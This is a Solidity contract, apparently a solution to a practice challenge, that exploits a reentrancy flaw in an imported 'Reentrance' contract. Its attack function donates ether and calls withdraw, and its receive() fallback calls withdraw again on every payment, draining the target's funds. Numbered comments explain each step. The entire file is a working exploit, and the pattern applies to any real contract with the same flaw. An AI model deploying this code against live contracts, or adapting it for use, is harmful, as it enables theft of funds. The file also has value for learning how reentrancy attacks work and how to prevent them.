// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Reentrance.sol";

contract ReentranceAttack {
    Reentrance reentrance;

    constructor(address _reentranceContractAddress) public {
        reentrance = Reentrance(payable(_reentranceContractAddress));
    }

    function sendDonation(address _to, uint256 _amountToDonate) public {
        reentrance.donate{value: _amountToDonate}(_to);
    }

    function attack(
        address _addrForDonation,
        uint256 _amountToDonateAndWithdraw
    ) public {
        // 1st step - donate to appear in the balances mapping
        reentrance.donate{value: _amountToDonateAndWithdraw}(_addrForDonation);

        // 2nd step - call withdraw -> it will make a call to this contract
        reentrance.withdraw(_amountToDonateAndWithdraw);
    }

    // 3rd step - external call with ether will trigger receive() func
    receive() external payable {
        // 4th step - we can re-enter the withdraw func
        reentrance.withdraw(msg.value);
    }
}
